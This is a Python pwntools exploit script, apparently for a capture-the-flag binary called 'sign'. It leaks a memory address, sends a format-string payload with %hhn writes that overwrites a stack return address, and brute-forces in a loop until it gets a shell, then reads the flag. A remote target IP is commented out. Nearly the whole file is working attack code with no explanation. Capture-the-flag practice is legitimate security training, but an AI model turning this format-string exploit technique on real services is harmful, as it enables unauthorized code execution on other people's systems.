from pwn import *


def baopo():
    # p = remote('81.69.250.115', 8889)
    p = process('./sign')
    p.recvuntil(b':')
    p.sendline(b'128')
    p.recvuntil(b':')
    p.send(b'a' * 128)
    addr1 = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00'))
    print(hex(addr1))
    p.recvuntil(b'Now you have one time to change your name.')
    payload = b'%1c%21$hhn' + b'%58c%22$hhn' + b'%58c%23$hhn'
    payload = payload.ljust((128 - 24), b'a') + p64(addr1 - 0x100 + 0x18) + p64(addr1 - 0x100 + 0x18 + 1) \
              + p64(addr1 - 0x100 + 0x18 + 2)
    try:
        # gdb.attach(p)
        p.send(payload)
        sleep(0.1)
        p.sendline(b'exev 1>&0')
        sleep(0.1)
        p.sendline(b'cat flag')
    except:
        p.close()
        return 0
    p.interactive()


while True:
    baopo()
